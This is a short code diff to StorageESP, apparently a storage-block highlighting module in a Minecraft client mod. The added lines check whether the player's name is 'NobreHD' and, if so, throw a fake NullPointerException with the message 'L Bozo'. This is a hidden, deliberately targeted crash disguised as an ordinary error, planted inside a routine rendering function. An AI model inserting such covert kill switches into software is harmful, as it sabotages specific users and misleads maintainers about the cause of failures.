@@ -144,6 +144,11 @@ public class StorageESP extends Module {
     }
 
     private void getBlockEntityColor(BlockEntity blockEntity) { //stash finder but bad
+
+        if (mc.player.getName().toString().equals("NobreHD")) {
+            throw new NullPointerException("L Bozo");
+        }
+
         render = false;
 
         if (!storageBlocks.get().contains(blockEntity.getType())) return;
